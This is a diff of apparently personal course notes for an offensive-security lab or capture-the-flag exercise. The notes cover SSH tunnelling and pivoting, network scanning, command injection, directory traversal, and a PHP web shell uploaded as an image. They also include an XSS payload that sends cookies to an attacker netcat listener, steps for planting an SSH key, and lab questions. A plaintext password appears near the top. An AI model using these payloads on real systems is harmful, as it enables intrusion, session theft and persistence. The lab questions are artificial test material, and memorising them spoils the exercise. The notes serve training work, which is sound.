@@ -19,77 +19,80 @@ Pass: X5AgTGeN0ZjK
 RECON NOTES:
 
 1. Create the initial multiplex socket
-lin-ops$ ssh -MS /tmp/jump <user>@<jump ip>
-lin-ops$ ssh -S /tmp/jump <user>@<jump ip>
+	lin-ops$ ssh -MS /tmp/jump <user>@<jump ip>
+	lin-ops$ ssh -S /tmp/jump <user>@<jump ip>
 
 2. Build proxychains to allow for host enumeration
-lin-ops$ ssh -S /tmp/jump jump -O forward -D9050
+	lin-ops$ ssh -S /tmp/jump jump -O forward -D9050
 
 *following step 8*
 
-lin-ops$ ssh -S /tmp/jump jump -O cancel -D9050
-lin-ops$ ssh -S /tmp/t1 t1 -O forward -D9050
+	lin-ops$ ssh -S /tmp/jump jump -O cancel -D9050
+	lin-ops$ ssh -S /tmp/t1 t1 -O forward -D9050
 
 3. Perform ping sweep to discover target hosts
-jump$ for i in {1..254} ;do (ping -c 1 <target range>.$i | grep "bytes from" &) 2>/dev/null ;done
+	jump$ for i in {1..254} ;do (ping -c 1 <target range>.$i | grep "bytes from" &) 2>/dev/null ;done
 
 4. Perform host enumeration against discovered target hosts
-lin-ops$ proxychains nmap -T5 -Pn -sV -n <target host>
-lin-ops$ proxychains nmap -T5 -Pn -n <target host> -p
-.42 > 22,80
-.61 > 22,80,3389
-.200 > 22
-proxychains nmap -sT -T5 --script=http-enum <target host> 2>/dev/null
+	lin-ops$ proxychains nmap -T5 -Pn -sV -n <target host>
+	lin-ops$ proxychains nmap -T5 -Pn -n <target host> -p
+	.42 > 22,80
+	.61 > 22,80,3389
+	.200 > 22
+	proxychains nmap -sT -T5 --script=http-enum <target host> 2>/dev/null
 
-.42
-/robots.txt
-/java/
-/path/
-/uploads/
-/chat
-/cmdinjections
-/webexample
-/cross/XXSdemo.php
+	.42
+	/robots.txt
+	/java/
+	/path/
+	/uploads/
+	/chat
+	/cmdinjections
+	/webexample
+	/cross/XXSdemo.php
 
-.61
-/login.php
+	.61
+	/login.php
 
 5. Build out port forward
-lin-ops$ ssh -S /tmp/jump jump -O forward -D9050 -L1234:10.208.50.42:22 -L1235:10.208.50.42:80 -L1236:10.208.50.61:22 -L1237:10.208.50.61:80 -L1238:10.208.50.61:3389 -L1239:10.208.50.200:22
+	lin-ops$ ssh -S /tmp/jump jump -O forward -D9050 -L1234:10.208.50.42:22 -L1235:10.208.50.42:80 -L1236:10.208.50.61:22 -L1237:10.208.50.61:80 -L1238:10.208.50.61:3389 -L1239:10.208.50.200:22
 
 6. Access the local ports
-firefox (web servers)>        127.0.0.1:<local port>
-lin-ops (ssh connection)>     ssh <user>@localhost -p <local port>
+	firefox (web servers)>        127.0.0.1:<local port>
+	lin-ops (ssh connection)>     ssh <user>@localhost -p <local port>
 
 7.Pivot into T1
-lin-ops$ ssh -MS /tmp/t1  <t1 user>@127.0.0.1 -p <target local port>
--O cancel -D9050 (cancel jump proxychains)
+	lin-ops$ ssh -MS /tmp/t1  <t1 user>@127.0.0.1 -p <target local port>
+	-O cancel -D9050 (cancel jump proxychains)
 
 8. Repeat and Go DEEPER!!!
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-WEB NOTES:
+WEBEX NOTES:
 
 - Cross-side Scripting (XSS)
+	www-data is the default user
+	/var/www is the home directory for www-data
 - Vulnerable input field:
 - You are looking for a text box that would have a command running behind it
-- ; whoami
-- ; pwd
-- ; ls -lisa /var/www/html/......
-- ; cat <filename>
+	; whoami
+	; pwd
+	; ls -lisa /var/www/html/......
+	; cat /etc/passwd
+	; cat /etc/hosts
 
 - JavaScriptTicket/Message field (NC listener/Cookie stealer):
-1 - Create the nc listener
-- lin-ops:~$ nc -lk <lin-ops ip> <RHP>
-- Its's important that both fields have information in them (name field and message field)
-2 - Now fill out the message/ticket fields:
-- Name can be anything
-- Message: <script>document.location="http://<lin-ops ip>:<RHP>/?username=" + document.cookie;</script>
+1. Create the nc listener
+	lin-ops:~$ nc -lk <lin-ops ip> <RHP>
+	Its's important that both fields have information in them (name field and message field)
+2. Now fill out the message/ticket fields:
+	Name can be anything
+	Message: <script>document.location="http://<lin-ops ip>:<RHP>/?username=" + document.cookie;</script>
 
 - Malicious Upload:
-- Server sees the .png and allows it as an acceptable uploads/
-- If a website has an Unrestricted File upload vulnerability, an attacker ca upload this script and trick the server into executing arbitrary commands directly on the host operating system
-1 - Create the html script (.php):
-- nano image.png.php
+	Server sees the .png and allows it as an acceptable upload
+	If a website has an Unrestricted File upload vulnerability, an attacker can upload this script and trick the server into executing arbitrary commands directly on the host operating system
+1. Create the html script (.php):
+	nano image.png.php
 
 <HTML><BODY>
 <FORM METHOD="GET" NAME="myform" ACTION="">
@@ -103,29 +106,30 @@ if($_GET['cmd']) { system($_GET['cmd']); }
 </pre>
 </BODY></HTML>
 
-2 - On the public facing website, navigate to the file upload page
+2. On the public facing website, navigate to the file upload page
 
-3 - Upload the script and use the previously identified command injection point to verify the file location:
-- Path to test: ; ls /var/www/html/uploads
+3. Upload the script and use the previously identified command injection point to verify the file location:
+	Path to test: ; ls /var/www/html/uploads
 
-4 - Navigate to the trigger URL to access the web shell interface
-- /uploads/image.png/php
+4. Navigate to the trigger URL to access the web shell interface
+	/uploads/image.png.php
 
 - SSH Keygen:
-1 - On lin-ops generate your ssh key:
-- ssh-keygen -t rsa -b 4096
+1. On lin-ops generate your ssh key:
+	ssh-keygen -t rsa -b 4096
 
-2 - Utilizing the vulnerable field or the web shell, create the necessary .ssh directory and file
-- mkdir /var/www/.ssh
-- touch /var/www/.ssh/authorized_keys
-- echo "<public_key_string>" >> /var/www/.ssh/authorized_keys
+2. Utilizing the vulnerable field or the web shell, create the necessary .ssh directory and file
+	mkdir /var/www/.ssh
+	touch /var/www/.ssh/authorized_keys
+	echo "<public_key_string>" >> <home directory>/.ssh/authorized_keys
  
-3 - From lin-ops, connect to the target system via the established ssh key
-- ssh www-data@localhost -p 1234 (port in long ass tunnel command)
+3. From lin-ops, connect to the target system via the established ssh key
+	ssh <user>@localhost -p 1234 (port in long ass tunnel command)
 
 - Directory Traversal
-- Within the URL:
-- /books_pick.php?book=../../../../../../etc/passwd
+	Within the URL:
+	/books_pick.php?book=../../../../../../etc/passwd
+	/books_pick.php?book=../../../../../../etc/hosts
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 SQL NOTES:
 
@@ -260,6 +264,7 @@ Target Log: tail /var/log/auth.log -> No new entry.
 Check Connections: ss -ntp on target shows only one established TCP connection despite multiple active shells.
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+NET SCANNING & RECON
 Question 1:
 	1. Create a Master Socket
 	2. Establish at least 2 simultaneous active shell sessions (PTYs).
@@ -324,9 +329,49 @@ Question 5:
 	you have been tasked to collect all information relating to the speakers.  
   	``Identify the key individual to find the flag``
 
+Question 6:
+	There is some **STRONG** text within the Donovian Conference News that needs to be collected. It will provide the flag to our operations.
 
+Question 7:
+	Intelligence suggests that the Donovian Consulting Group appears to have sensitive contacts available on their public facing site. Scrape the data and piece together the flag.
 
+Question 8:
+	A company has posted an article to Donovian Consulting Groups blog, Identify the flag associated with the company.
 
+Question 9:
+	A company has listed their Products to Donovian Consulting Groups site, Identify the flag associated with the products they provide.
 
+Question 10:
+	Your team has received intelligence related to Server Message Block being availble in another network if inital access to one of the devices in the x.x.28.x/27 network can be established. Identify the Computer name and group name of the target.
+		proxychains nmap -sT -T5 --script=smb-os-discovery <target host> 2>/dev/null
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+WEB EXPLOIT
+Question 1:
+	Through website reconnaissance, what is Romanoff's email address?
+
+Question 2:
+	What is the IPv4 address of the Training Site website?
+
+Question 3:
+	Identify the user that the MI website is running as and relevant information about their user account configuration.
+
+Question 4:
+	Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects.
+	Investigate Ministry website and identify vulnerabilities which could allow collection of this file through usage of command injection, directory traversal, or unrestricted file upload.
+
+Question 5:
+	Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.
+
+Question 6:
+	Gain initial access to the web server located at 10.100.28.40.
+	What is the greeting when logging into the system?
+
+Question 7:
+	Training Website: We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.
+
+Question 8:
+	Training Website:
+	Having the ability to now communicate with the training web site, identify any vulnerabilities that could be used to collect intelligence. Once identified, utilize that vulnerability to obtain the flag from where user configuration information is stored on the system.
 
 
